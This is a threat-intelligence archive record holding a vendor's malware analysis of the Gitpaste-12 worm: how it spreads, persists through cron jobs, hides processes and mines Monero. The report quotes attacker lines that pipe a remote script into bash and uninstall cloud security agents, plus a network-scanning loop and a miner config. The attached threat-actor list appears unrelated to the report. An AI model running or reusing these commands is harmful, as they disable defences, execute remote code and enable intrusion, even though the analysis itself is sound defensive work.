{
    "id": "fd0f0083-ad28-4580-85ee-2531ee0d1a74",
    "created_at": "2023-01-12T15:03:34.482753Z",
    "updated_at": "2025-03-27T02:14:34.097356Z",
    "deleted_at": null,
    "sha1_hash": "fd8a97ea44cd7e80628bff146e933b061be0da5a",
    "title": "2020-11-05 - Gitpaste-12- a new worming botnet with reverse shell capability spreading via GitHub and Pastebin",
    "authors": "",
    "file_creation_date": "2022-05-27T22:05:56Z",
    "file_modification_date": "2022-05-27T22:05:56Z",
    "file_size": 739891,
    "plain_text": "# Gitpaste-12: a new worming botnet with reverse shell capability spreading via GitHub and Pastebin\n\n**blogs.juniper.net/en-us/threat-research/gitpaste-12**\n\nNovember 5, 2020\n\nGitpaste-12 is a new worm recently discovered by Juniper Threat Labs, which uses GitHub and Pastebin for housing component\ncode and has at least 12 different attack modules available.\n\nThere is evidence of test code for possible future modules, indicating ongoing development for this malware. For now, however,\ntargets are Linux based x86 servers, as well as Linux ARM and MIPS based IoT devices.\n\nThis malware has been dubbed Gitpaste-12 because of the usage of GitHub, Pastebin and 12 ways to compromise the system.\nThe first GitPaste-12 first attacks were detected by Juniper Threat Labs on October 15, 2020. We’ve reported both the Pastebin\nURL and the git repo in question and the git repo was closed on October 30, 2020. This should stop the proliferation of this\nbotnet.\n\nThe GitHub repository used at the time of discovery was as follows:\n\nhttps://github[.]com/cnmnmsl-001/\nFirst commit Thu Jul 9 21:07:06 2020\n\nLast commit Oct 27, 2020\n\n\n-----\n\n## Anatomy of Gitpaste-12\n\nThe first phase of the attack is the initial system compromise (note the details of compromises used by this worm will be\ndiscussed later in this piece). This worm has 12 known attack modules and more under development. The worm will attempt to\nuse known exploits to compromise systems and may also attempt to brute force passwords.\n\nImmediately after compromising a system, the malware sets up a cron job it downloads from Pastebin, which in turn calls the\nsame script and executes it again each minute. This is presumably one mechanism by which updates to the cron jobs can be\npushed to the botnet.\n\nThe main shell script uploaded during the attack to the victim machine starts to download and execute other components of\nGitpaste-12. First, it downloads and sets up cron job, which periodically downloads and executes script from Pastebin:\n\n[Next, it downloads from GitHub (https://raw.githubusercontent[.]com/cnmnmsl-001/-/master/shadu1) and executes it.](https://blogs.juniper.net/en-us/threat-research/blank)\n\nThe malware begins by preparing the environment. This means stripping the system of its defenses, including firewall rules,\nselinux, apparmor, as well as common attack prevention and monitoring software.\n\nThe shadu1 script contains comments in the Chinese language and has multiple commands available to attackers to disable\ndifferent security capabilities, as discussed above. The following example has some commands that disable cloud security\nagents, which clearly indicates the threat actor intends to target public cloud computing infrastructure provided by Alibaba Cloud\nand Tencent.\n\nExamples of these commands include:\n\n\n-----\n\n```\n     p p g y |\ncurl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash\n/usr/local/qcloud/stargate/admin/uninstall.sh\n/usr/local/qcloud/YunJing/uninst.sh\n/usr/local/qcloud/monitor/barad/admin/uninstall.sh\n\n```\nAnother capability is demonstrated in the ability to run miner for monero cryptocurrency with the following config:\n\n{ “background”: true, “log-file”: null, “access-log-file”: null, “retries”: 50, “retry-pause”: 5, “donate-level”: 2, “coin”: “xmr”, “customdiff”: 0, “syslog”: false, “verbose”: false, “colors”: true, “workers”: true, “pools”: [ { “url”: “donate.v2.xmrig.com:5555”, “user”:\n“41qALJpqLhUNCHZTMSMQyf4LQotae9MZnb4u53JzqvHEWyc2i8PEFUCZ4TGL9AGU34ihPU8QGbRzc4FB2nHMsVeMHaYkxus”,\n“pass”: “x” } ], “bind”: [ “0.0.0.0:12388” ], “api”: { “port”: 0, “access-token”: null, “worker-id”: null }}\n\n\n-----\n\nThe Gitpaste 12 malware contains the library hide.so and is loaded as LD_PRELOAD. Hide.so updates the crontab file to\ndownload and execute https://pastebin[.]com/raw/Tg5FQHhf. It also prevents administrators from collecting information about\nrunning processes by intercepting “readdir” system calls and skip directories for processes like tcpdump, sudo, openssl, etc. in\n“/proc”. The “/proc” directory in Linux contains information about running processes. It is used, for example, by the “ps” command\nto show information about running processes. But unfortunately for this threat actor, this implementation does not do what they\nexpect it to do.\n\n## Worming Capability\n\nThe Gitpaste-12 malware also contains a script that launches attacks against other machines, in an attempt to replicate and\nspread. It chooses a random /8 CIDR for attack and will try all addresses within that range, as demonstrated by this call:\n\nwhile true;do awk -va=\\$((\\$RANDOM%128)) ‘BEGIN{for(b=0;256>b;b++) for(c=0;256>c;c++) for(d=0;256>d;d++) system(\\”./sh\n\\”a\\”.\\”d\\”.\\”c\\”.\\”b\\”\n\nAnd here we can see the worm attempting to spread:\n\nAnother version of the script also opens ports 30004 and 30005 for reverse shell commands:\n\n## Gitpaste-12 Exploits\n\nGitpaste-12 uses 11 vulnerabilities and a telnet brute forcer to spread. Known vulnerabilities include:\n\nCVE-2017-14135 Webadmin plugin for opendreambox\n\nCVE-2020-24217 HiSilicon based IPTV/H.264/H.265 video encoders\n\nCVE-2017-5638 Apache Struts\n\nCVE-2020-10987 Tenda router\n\nCVE-2014-8361 Miniigd SOAP service in Realtek SDK\n\nCVE-2020-15893 UPnP in dlink routers\n\nCVE-2013-5948 Asus routers\n\nEDB-ID: 48225 Netlink GPON Router\n\nEDB-ID: 40500 AVTECH IP Camera\n\nCVE-2019-10758 Mongo db\n\nCVE-2017-17215 (Huawei router)\n\n\n-----\n\n## Conclusion\n\nNo malware is good to have, but worms are particularly annoying. Their ability to spread in an automated fashion can lead to\nlateral spread within an organization or to your hosts attempting to infect other networks across the internet, resulting in poor\nreputation for your organization.\n\nJuniper Connected Security customers using SRX IDP and Juniper ATP Cloud are protected against Gitpaste-12.\n\n## IOCs\n\nSome compromised systems have TCP ports 30004 and 30005 open for shell commands.\n\n\n-----\n\nMiner: e67f78c479857ed8c562e576dcc9a8471c5f1ab4c00bb557b1b9c2d9284b8af9\n\nhide.so: ed4868ba445469abfa3cfc6c70e8fdd36a4345c21a3f451c7b65d6041fb8492b\n\nMiner config: bd5e9fd8215f80ca49c142383ba7dbf7e24aaf895ae25af96bdab89c0bdcc3f1\n\nShell script: 5d1705f02cde12c27b85a0104cd76a39994733a75fa6e1e5b014565ad63e7bc3\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-05 - Gitpaste-12- a new worming botnet with reverse shell capability spreading via GitHub and Pastebin.pdf"
    ],
    "report_names": [
        "2020-11-05 - Gitpaste-12- a new worming botnet with reverse shell capability spreading via GitHub and Pastebin.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535814,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1653689156,
    "ts_modification_date": 1653689156,
    "files": {
        "pdf": "https://archive.orkl.eu/fd8a97ea44cd7e80628bff146e933b061be0da5a.pdf",
        "text": "https://archive.orkl.eu/fd8a97ea44cd7e80628bff146e933b061be0da5a.txt",
        "img": "https://archive.orkl.eu/fd8a97ea44cd7e80628bff146e933b061be0da5a.jpg"
    }
}